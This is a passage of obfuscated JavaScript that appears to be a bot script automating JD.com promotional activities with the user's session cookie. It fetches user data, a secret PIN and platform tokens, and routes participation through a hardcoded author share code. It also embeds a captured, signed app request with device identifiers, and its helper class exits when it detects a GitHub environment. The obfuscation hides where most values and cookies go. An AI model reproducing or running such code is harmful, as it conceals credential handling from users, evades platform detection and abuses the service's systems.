_0x4be4b6>_0x1ba849;},'bOvxe':function(_0x30baf9,_0x391e76){return _0x30baf9(_0x391e76);}};return new Promise(async _0x1d094b=>{$['get']({'url':_0x98f1('12a','(aKC')+_0x3c37be},(_0x51afcd,_0x327f2b,_0xba56ad)=>{try{if(_0x51afcd){console['log'](''+JSON['stringify'](_0x51afcd));}else{if(_0xba56ad){_0xba56ad=JSON['parse'](_0xba56ad);if(_0x905598[_0x98f1('12b','2GYp')](_0xba56ad['data'][_0x98f1('12c','n[M7')],0x0)){$[_0x98f1('12d','TlVP')]=_0xba56ad[_0x98f1('12e','g6z4')][0x0][_0x98f1('12f','$Pni')];}else{$[_0x98f1('130','8AT[')]='';}}}}catch(_0x56aaaa){$[_0x98f1('131','L)Ss')](_0x56aaaa,_0x327f2b);}finally{_0x905598['bOvxe'](_0x1d094b,_0xba56ad);}});});}function getUserInfo(){var _0x280548={'TnPlI':function(_0x408b84,_0x522d9d){return _0x408b84(_0x522d9d);},'ndISu':function(_0x570124,_0x340ee5,_0x36ca4d){return _0x570124(_0x340ee5,_0x36ca4d);},'ZtXxz':_0x98f1('132','2B85')};return new Promise(_0x41338d=>{let _0x30131a=_0x98f1('133','xD@)')+_0x280548[_0x98f1('134','giCj')](encodeURIComponent,$[_0x98f1('135','$Pni')]);$['post'](_0x280548[_0x98f1('136','zO$i')](taskPostUrl,_0x280548[_0x98f1('137','LOQE')],_0x30131a),async(_0x31a387,_0x35a08f,_0x4eef80)=>{try{if(_0x31a387){console[_0x98f1('138','ELmL')](''+JSON[_0x98f1('139','V4rd')](_0x31a387));}else{_0x4eef80=JSON[_0x98f1('13a',')S0x')](_0x4eef80);if(_0x4eef80['data']){console['log']('用户【'+_0x4eef80[_0x98f1('13b','QCvj')][_0x98f1('13c','GrJK')]+'】信息获取成功');$['userId']=_0x4eef80['data']['id'];$['pinImg']=_0x4eef80[_0x98f1('13d','V4rd')][_0x98f1('13e','$Pni')];$[_0x98f1('13f','(aKC')]=_0x4eef80[_0x98f1('42','6gz6')][_0x98f1('140','3q4J')];}else{console['log'](_0x4eef80);}}}catch(_0x5bf59e){$[_0x98f1('141','i%hs')](_0x5bf59e,_0x35a08f);}finally{_0x41338d(_0x4eef80);}});});}function getMyPing(){var _0x29518b={'dxAAR':function(_0x21ade9){return _0x21ade9();},'cPwhA':function(_0x58f5e5,_0x4d0a67,_0x4b797c){return _0x58f5e5(_0x4d0a67,_0x4b797c);}};return new Promise(_0x563326=>{var _0x13cb25={'ToDGS':function(_0x184721){return _0x29518b[_0x98f1('142','t6QO')](_0x184721);}};$['post'](_0x29518b[_0x98f1('143','L)Ss')](taskPostUrl,'customer/getMyPing',_0x98f1('144','5R93')+$['shopId']+_0x98f1('145','xD@)')+$[_0x98f1('146','N%%9')]+'&fromType=APP'),async(_0x11e405,_0x556fcf,_0x196682)=>{try{if(_0x11e405){console['log'](''+JSON[_0x98f1('147','kr9o')](_0x11e405));}else{_0x196682=JSON[_0x98f1('94','trB^')](_0x196682);if(_0x196682[_0x98f1('148','liq%')]){$[_0x98f1('149','A*v3')]=_0x196682['data'][_0x98f1('14a','i0Nw')];cookie=_0x98f1('14b','L)Ss')+$['secretPin']+';'+cookie;}}}catch(_0x2aa4aa){$[_0x98f1('14c','GrJK')](_0x2aa4aa,_0x556fcf);}finally{_0x13cb25[_0x98f1('14d','giCj')](_0x563326);}});});}function getActInfo(){var _0x1c785e={'hgKAU':function(_0x299081,_0x371dfd,_0xdb091b){return _0x299081(_0x371dfd,_0xdb091b);}};return new Promise(_0x320d0e=>{$[_0x98f1('14e','jn82')](_0x1c785e['hgKAU'](taskPostUrl,_0x98f1('14f','jn82'),_0x98f1('150','GrJK')+ACT_ID),async(_0x54f66c,_0x4d13ba,_0x42af3c)=>{try{if(_0x54f66c){console[_0x98f1('151','VDG%')](''+JSON['stringify'](_0x54f66c));}else{_0x42af3c=JSON['parse'](_0x42af3c);if(_0x42af3c[_0x98f1('148','liq%')]){$[_0x98f1('152',']sxo')]=_0x42af3c[_0x98f1('153','lFun')][_0x98f1('154','L)Ss')];}}}catch(_0x502148){$['logErr'](_0x502148,_0x4d13ba);}finally{_0x320d0e(_0x42af3c);}});});}function grantTokenKey(){var _0x76c970={'KsfvF':function(_0x5c7c50){return _0x5c7c50();},'ngQNv':_0x98f1('155','VDG%'),'dQPOj':_0x98f1('156','4c^^'),'LcSFt':_0x98f1('157','N%%9'),'IgXDM':_0x98f1('158','3m7j'),'tqgGu':_0x98f1('159','2B85')};let _0x481112={'url':_0x76c970['ngQNv'],'headers':{'Host':_0x76c970[_0x98f1('15a','L)Ss')],'Content-Type':_0x76c970['LcSFt'],'Accept':_0x76c970[_0x98f1('15b','zO$i')],'Connection':'keep-alive','Cookie':cookie,'User-Agent':_0x98f1('15c','V4rd'),'Accept-Language':_0x98f1('15d','jn82'),'Accept-Encoding':_0x76c970[_0x98f1('15e','A9!h')]},'body':'body=%7B%22to%22%3A%22https%3A%5C/%5C/lzdz-isv.isvjcloud.com%5C/dingzhi%5C/change%5C/able%5C/activity?activityId%3Ddz2102100001340205%22%2C%22action%22%3A%22to%22%7D&build=167568&client=apple&clientVersion=9.4.2&d_brand=apple&d_model=iPhone12%2C1&eid=eidIbfcc8121a3sct6%2BZJKZeTX6Kw9Ku2bFIdLevmpw4UcG7PaSe2el%2BDdi10Z8E1MMLqWhuF8xiJDdx1DqRQ44vLt8yni%2BSGFKrEaSQGbBBNtzjHZ1t&isBackground=N&joycious=44&lang=zh_CN&networkType=wifi&networklibtype=JDNetworkBaseAF&openudid=385f383ec315d8d01c64a09021df04ef9930c99d&osVersion=14.3&partner=apple&rfs=0000&scope=01&screen=828%2A1792&sign=96ced1a3158cb41dd1b286f706d91554&st=1614917734401&sv=120&uts=0f31TVRjBSsqndu4/jgUPz6uymy50MQJKfbYxxIwfaVeZuOo3SxuAtrc5hGhwSeyqATNq1sOtuG4KO02ef9RgDJ5p8y14ALu4Wwsq%2BoFpVWgl3hmjwodUgIrZ3wtfzwsoVm7DiN0g8qGHTtfd0Y5An3oFegg2F9Qb1oSKUr0%2BJSivRbuiLomybQjfanl9f2%2B7z7tj8MqOb6RjRBtQKtUvw%3D%3D&uuid=hjudwgohxzVu96krv/T6Hg%3D%3D&wifiBssid=unknown'};return new Promise(_0x54f8a0=>{var _0xb2c24e={'pRVSH':function(_0x2b5970,_0x5f0b9b){return _0x2b5970===_0x5f0b9b;},'rBRLo':function(_0x1d63c0){return _0x76c970['KsfvF'](_0x1d63c0);}};$[_0x98f1('15f','KWQ@')](_0x481112,(_0x393591,_0x241e16,_0x4daa86)=>{try{if(_0x393591){console[_0x98f1('160','giCj')](''+JSON[_0x98f1('161','MPK!')](_0x393591));}else{_0x4daa86=JSON[_0x98f1('162','2GYp')](_0x4daa86);if(_0xb2c24e[_0x98f1('163','3q4J')](_0x4daa86[_0x98f1('164','hHDf')],'0')){$[_0x98f1('165','V4rd')]=_0x4daa86[_0x98f1('166','xD@)')];cookie=cookie+_0x98f1('167','V4rd')+$[_0x98f1('168','3m7j')];}}}catch(_0x1c7ec7){console[_0x98f1('169','@ud(')](_0x1c7ec7,_0x241e16);}finally{_0xb2c24e['rBRLo'](_0x54f8a0);}});});}function grantToken(){var _0x299d46={'iwlRo':function(_0xd96419){return _0xd96419();},'iZtQz':_0x98f1('16a','V4rd'),'vtHlY':'application/x-www-form-urlencoded','GewgF':_0x98f1('16b','giCj'),'lYSlU':'keep-alive'};let _0x157b94={'url':_0x299d46[_0x98f1('16c','8AT[')],'headers':{'Host':_0x98f1('16d',']sxo'),'Content-Type':_0x299d46['vtHlY'],'Accept':_0x299d46[_0x98f1('16e','5R93')],'Connection':_0x299d46[_0x98f1('16f','giCj')],'Cookie':cookie,'User-Agent':'JD4iPhone/167538\x20(iPhone;\x20iOS\x2014.3;\x20Scale/3.00)','Accept-Language':_0x98f1('170','V4rd'),'Accept-Encoding':_0x98f1('171','LOQE')},'body':_0x98f1('172','GrJK')};return new Promise(_0x1b7296=>{$['post'](_0x157b94,(_0x4d24a6,_0x314058,_0x5f4b61)=>{try{if(_0x4d24a6){console['log'](''+JSON[_0x98f1('173','TlVP')](_0x4d24a6));}else{_0x5f4b61=JSON['parse'](_0x5f4b61);if(_0x5f4b61[_0x98f1('174','g6z4')]==='0'){$['token']=_0x5f4b61[_0x98f1('175','sBkC')];}}}catch(_0x1e64f5){console['log'](_0x1e64f5);}finally{_0x299d46[_0x98f1('176',']sxo')](_0x1b7296);}});});}function getActCookie(){var _0x1c3f97={'IRPhh':_0x98f1('177','t6QO'),'vPVCp':_0x98f1('178','ELmL'),'eLXtd':_0x98f1('179','trB^'),'RQlfs':'keep-alive','XHANh':'jdapp;iPhone;9.3.8;14.3;network/wifi;ADID/;supportApplePay/0;hasUPPay/0;hasOCPay/0;model/iPhone10,3;supportBestPay/0;appBuild/167538;jdSupportDarkMode/0;addressid/0;pv/1.12;apprpd/Babel_Native;ref/JDWebViewController;psq/11;ads/;psn/;jdv/0|;adk/;app_device/IOS;pap/JA2015_311210|9.3.8|IOS\x2014.3;Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2014_3\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Mobile/15E148;supportJDSHWK/1','JwnPe':'zh-Hans-CN;q=1','HbRhu':_0x98f1('17a','t6QO')};let _0x36cc6f={'url':ACT_URL+_0x98f1('17b',')S0x')+ACT_ID+_0x98f1('17c','L)Ss')+$['authorShareCode'],'headers':{'Content-Type':_0x1c3f97[_0x98f1('17d','xUEu')],'Accept':_0x1c3f97[_0x98f1('17e','V4rd')],'Connection':_0x1c3f97['RQlfs'],'Cookie':''+cookie,'User-Agent':_0x1c3f97['XHANh'],'Accept-Language':_0x1c3f97[_0x98f1('17f','n[M7')],'Accept-Encoding':_0x1c3f97[_0x98f1('180','$Pni')]}};return new Promise(_0x1d11a3=>{var _0x1c7d50={'VcOHG':_0x1c3f97['IRPhh'],'lpzHd':_0x98f1('181','liq%'),'aRqMk':_0x98f1('182','QCvj')};$[_0x98f1('183','i%hs')](_0x36cc6f,(_0x17b4a5,_0x4d3c6c,_0x2992f8)=>{try{if(_0x17b4a5){console[_0x98f1('184','4c^^')](''+JSON['stringify'](_0x17b4a5));}else{cookie=cookie+';';if($['isNode']())for(let _0x3c8d05 of _0x4d3c6c[_0x1c7d50[_0x98f1('185','A9!h')]][_0x1c7d50[_0x98f1('186','sBkC')]]){cookie=''+cookie+_0x3c8d05['split'](';')[0x0]+';';}else{for(let _0x2164e1 of _0x4d3c6c[_0x1c7d50[_0x98f1('187','B)]]')]][_0x1c7d50['aRqMk']][_0x98f1('188','xD@)')](',')){cookie=''+cookie+_0x2164e1[_0x98f1('189','8AT[')](';')[0x0]+';';}}}}catch(_0x53a4be){console[_0x98f1('18a','2GYp')](_0x53a4be);}finally{_0x1d11a3();}});});}function taskPostUrl(_0x2297ad,_0x42d04d){var _0x405eb0={'EymkL':_0x98f1('18b','*2j4'),'KqbXR':_0x98f1('18c','i0Nw'),'Pbfej':_0x98f1('18d','QCvj'),'Evhlz':_0x98f1('18e','*2j4'),'ascfo':_0x98f1('18f','g6z4'),'WFvgH':_0x98f1('190','A*v3'),'itWRD':_0x98f1('191','A9!h'),'KRdIX':_0x98f1('192','4c^^'),'BbQTt':_0x98f1('193','(4Ec')};return{'url':_0x98f1('194','kr9o')+_0x2297ad,'headers':{'Host':_0x405eb0['EymkL'],'Accept':_0x405eb0[_0x98f1('195','B)]]')],'X-Requested-With':_0x405eb0[_0x98f1('196','QCvj')],'Accept-Language':_0x405eb0[_0x98f1('197','*2j4')],'Accept-Encoding':_0x405eb0[_0x98f1('198','B)]]')],'Content-Type':_0x405eb0['WFvgH'],'Origin':_0x405eb0['itWRD'],'Connection':_0x405eb0[_0x98f1('199','GrJK')],'Referer':ACT_URL+'?activityId='+ACT_ID+_0x98f1('19a','GrJK')+$['authorShareCode'],'Cookie':''+cookie,'User-Agent':_0x405eb0[_0x98f1('19b','kr9o')]},'body':_0x42d04d};}function checkCookie(){var _0x232014={'vpagZ':_0x98f1('19c','2B85'),'RGDHE':function(_0x8401c1){return _0x8401c1();},'MQYHb':_0x98f1('19d','liq%'),'KswIG':'me-api.jd.com','DdUHq':_0x98f1('19e','A9!h'),'DTNAM':'Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2014_3\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Version/14.0.2\x20Mobile/15E148\x20Safari/604.1','skOSd':_0x98f1('19f','ELmL'),'sIdvz':'gzip,\x20deflate,\x20br'};const _0xf579f8={'url':_0x232014[_0x98f1('1a0','(4Ec')],'headers':{'Host':_0x232014['KswIG'],'Accept':_0x232014['DdUHq'],'Connection':_0x98f1('1a1','$Pni'),'Cookie':cookie,'User-Agent':_0x232014['DTNAM'],'Accept-Language':_0x232014['skOSd'],'Referer':'https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&','Accept-Encoding':_0x232014[_0x98f1('1a2','3m7j')]}};return new Promise(_0x39ecbe=>{var _0x4d2e15={'fmqbo':_0x232014[_0x98f1('1a3','ELmL')],'skSKk':function(_0x50a4ff,_0x4b96e3){return _0x50a4ff===_0x4b96e3;},'MoNnd':_0x98f1('1a4','6gz6'),'FWHmV':_0x98f1('1a5','dXRL'),'kmpXE':function(_0x39e21e){return _0x232014[_0x98f1('1a6','LOQE')](_0x39e21e);}};$['get'](_0xf579f8,(_0xab85e6,_0x3d8951,_0x11d2ce)=>{try{if(_0xab85e6){$[_0x98f1('1a7',')S0x')](_0xab85e6);}else{if(_0x11d2ce){_0x11d2ce=JSON[_0x98f1('1a8','L)Ss')](_0x11d2ce);if(_0x11d2ce[_0x98f1('1a9','n[M7')]===_0x4d2e15[_0x98f1('1aa','(4Ec')]){$[_0x98f1('1ab','VDG%')]=![];return;}if(_0x4d2e15['skSKk'](_0x11d2ce['retcode'],'0')&&_0x11d2ce[_0x98f1('1ac','i0Nw')][_0x98f1('1ad','6gz6')](_0x4d2e15['MoNnd'])){$[_0x98f1('1ae','V4rd')]=_0x11d2ce[_0x98f1('1af','ELmL')][_0x98f1('1b0','@ud(')]['baseInfo'][_0x98f1('1b1','i%hs')];}}else{$[_0x98f1('1b2','i0Nw')](_0x4d2e15[_0x98f1('1b3','B)]]')]);}}}catch(_0x3e7d0c){$[_0x98f1('1b4','QCvj')](_0x3e7d0c);}finally{_0x4d2e15[_0x98f1('1b5','KWQ@')](_0x39ecbe);}});});};_0xodj='jsjiami.com.v6';


// prettier-ignore
function Env(t, e) { "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0); class s { constructor(t) { this.env = t } send(t, e = "GET") { t = "string" == typeof t ? { url: t } : t; let s = this.get; return "POST" === e && (s = this.post), new Promise((e, i) => { s.call(this, t, (t, s, r) => { t ? i(t) : e(s) }) }) } get(t) { return this.send.call(this.env, t) } post(t) { return this.send.call(this.env, t, "POST") } } return new class { constructor(t, e) { this.name = t, this.http = new s(this), this.data = null, this.dataFile = "box.dat", this.logs = [], this.isMute = !1, this.isNeedRewrite = !1, this.logSeparator = "\n", this.startTime = (new Date).getTime(), Object.assign(this, e), this.log("", `🔔${this.name}, 开始!`) } isNode() { return "undefined" != typeof module && !!module.exports } isQuanX() { return "undefined" != typeof $task } isSurge() { return "undefined" != typeof $httpClient && "undefined" == typeof $loon } isLoon() { return "undefined" != typeof $loon } toObj(t, e = null) { try { return JSON.parse(t) } catch { return e } } toStr(t, e = null) { try { return JSON.stringify(t) } catch { return e } } getjson(t, e) { let s = e; const i = this.getdata(t); if (i) try { s = JSON.parse(this.getdata(t)) } catch { } return s } setjson(t, e) { try { return this.setdata(JSON.stringify(t), e) } catch { return !1 } } getScript(t) { return new Promise(e => { this.get({ url: t }, (t, s, i) => e(i)) }) } runScript(t, e) { return new Promise(s => { let i = this.getdata("@chavy_boxjs_userCfgs.httpapi"); i = i ? i.replace(/\n/g, "").trim() : i; let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout"); r = r ? 1 * r : 20, r = e && e.timeout ? e.timeout : r; const [o, h] = i.split("@"), n = { url: `http://${h}/v1/scripting/evaluate`, body: { script_text: t, mock_type: "cron", timeout: r }, headers: { "X-Key": o, Accept: "*/*" } }; this.post(n, (t, e, i) => s(i)) }).catch(t => this.logErr(t)) } loaddata() { if (!this.isNode()) return {}; { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e); if (!s && !i) return {}; { const i = s ? t : e; try { return JSON.parse(this.fs.readFileSync(i)) } catch (t) { return {} } } } } writedata() { if (this.isNode()) { this.fs = this.fs ? this.fs : require("fs"), this.path = this.path ? this.path : require("path"); const t = this.path.resolve(this.dataFile), e = this.path.resolve(process.cwd(), this.dataFile), s = this.fs.existsSync(t), i = !s && this.fs.existsSync(e), r = JSON.stringify(this.data); s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r) } } lodash_get(t, e, s) { const i = e.replace(/\[(\d+)\]/g, ".$1").split("."); let r = t; for (const t of i) if (r = Object(r)[t], void 0 === r) return s; return r } lodash_set(t, e, s) { return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t) } getdata(t) { let e = this.getval(t); if (/^@/.test(t)) { const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t), r = s ? this.getval(s) : ""; if (r) try { const t = JSON.parse(r); e = t ? this.lodash_get(t, i, "") : e } catch (t) { e = "" } } return e } setdata(t, e) { let s = !1; if (/^@/.test(e)) { const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e), o = this.getval(i), h = i ? "null" === o ? null : o || "{}" : "{}"; try { const e = JSON.parse(h); this.lodash_set(e, r, t), s = this.setval(JSON.stringify(e), i) } catch (e) { const o = {}; this.lodash_set(o, r, t), s = this.setval(JSON.stringify(o), i) } } else s = this.setval(t, e); return s } getval(t) { return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null } setval(t, e) { return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null } initGotEnv(t) { this.got = this.got ? this.got : require("got"), this.cktough = this.cktough ? this.cktough : require("tough-cookie"), this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar, t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar)) } get(t, e = (() => { })) { t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon() ? (this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.get(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) })) : this.isQuanX() ? (this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t))) : this.isNode() && (this.initGotEnv(t), this.got(t).on("redirect", (t, e) => { try { if (t.headers["set-cookie"]) { const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString(); s && this.ckjar.setCookieSync(s, null), e.cookieJar = this.ckjar } } catch (t) { this.logErr(t) } }).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) })) } post(t, e = (() => { })) { if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, { "X-Surge-Skip-Scripting": !1 })), $httpClient.post(t, (t, s, i) => { !t && s && (s.body = i, s.statusCode = s.status), e(t, s, i) }); else if (this.isQuanX()) t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, { hints: !1 })), $task.fetch(t).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => e(t)); else if (this.isNode()) { this.initGotEnv(t); const { url: s, ...i } = t; this.got.post(s, i).then(t => { const { statusCode: s, statusCode: i, headers: r, body: o } = t; e(null, { status: s, statusCode: i, headers: r, body: o }, o) }, t => { const { message: s, response: i } = t; e(s, i, i && i.body) }) } } time(t, e = null) { const s = e ? new Date(e) : new Date; let i = { "M+": s.getMonth() + 1, "d+": s.getDate(), "H+": s.getHours(), "m+": s.getMinutes(), "s+": s.getSeconds(), "q+": Math.floor((s.getMonth() + 3) / 3), S: s.getMilliseconds() }; /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length))); for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length))); return t } msg(e = t, s = "", i = "", r) { const o = t => { if (!t) return t; if ("string" == typeof t) return this.isLoon() ? t : this.isQuanX() ? { "open-url": t } : this.isSurge() ? { url: t } : void 0; if ("object" == typeof t) { if (this.isLoon()) { let e = t.openUrl || t.url || t["open-url"], s = t.mediaUrl || t["media-url"]; return { openUrl: e, mediaUrl: s } } if (this.isQuanX()) { let e = t["open-url"] || t.url || t.openUrl, s = t["media-url"] || t.mediaUrl; return { "open-url": e, "media-url": s } } if (this.isSurge()) { let e = t.url || t.openUrl || t["open-url"]; return { url: e } } } }; if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) { let t = ["", "==============📣系统通知📣=============="]; t.push(e), s && t.push(s), i && t.push(i), console.log(t.join("\n")), this.logs = this.logs.concat(t) } } log(...t) { t.length > 0 && (this.logs = [...this.logs, ...t]), console.log(t.join(this.logSeparator)) } logErr(t, e) { const s = !this.isSurge() && !this.isQuanX() && !this.isLoon(); s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t) } wait(t) { return new Promise(e => setTimeout(e, t)) } done(t = {}) { const e = (new Date).getTime(), s = (e - this.startTime) / 1e3; this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }
